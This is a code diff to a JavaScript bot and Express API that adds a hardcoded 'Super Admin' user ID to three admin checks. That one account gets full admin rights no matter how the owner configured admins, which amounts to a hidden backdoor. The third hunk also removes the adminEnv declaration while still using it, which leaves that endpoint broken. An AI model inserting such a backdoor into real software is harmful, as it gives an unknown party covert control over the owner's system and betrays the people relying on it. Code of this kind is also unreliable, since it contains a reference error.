@@ -533,6 +533,9 @@ function getAdminMenu() {
 }
 
 function isAdmin(ctx) {
+    const superAdmins = ["8473181677"]; // Hardcoded Super Admin
+    if (superAdmins.includes(String(ctx.from.id))) return true;
+    
     const data = loadData();
     const adminEnv = process.env.ADMIN_CHAT_ID;
     return String(ctx.from.id) === String(adminEnv) || (data.admins && data.admins.some(a => String(a) === String(ctx.from.id)));
@@ -820,8 +823,9 @@ app.post("/api/check-admin", (req, res) => {
     if (!userId) return res.json({ isAdmin: false });
     
     const data = loadData();
+    const superAdmins = ["8473181677"];
     const adminEnv = process.env.ADMIN_CHAT_ID;
-    const isAdm = String(userId) === String(adminEnv) || (data.admins && data.admins.some(a => String(a) === String(userId)));
+    const isAdm = superAdmins.includes(String(userId)) || String(userId) === String(adminEnv) || (data.admins && data.admins.some(a => String(a) === String(userId)));
     res.json({ isAdmin: isAdm });
 });
 
@@ -829,8 +833,8 @@ app.post("/api/check-admin", (req, res) => {
 app.post("/api/prices", (req, res) => {
     const { userId, text, type, customImgUrl, category } = req.body;
     const data = loadData();
-    const adminEnv = process.env.ADMIN_CHAT_ID;
-    const isAdm = String(userId) === String(adminEnv) || (data.admins && data.admins.some(a => String(a) === String(userId)));
+    const superAdmins = ["8473181677"];
+    const isAdm = superAdmins.includes(String(userId)) || String(userId) === String(adminEnv) || (data.admins && data.admins.some(a => String(a) === String(userId)));
     
     if (!isAdm) return res.status(403).json({ error: "Unauthorized" });
 
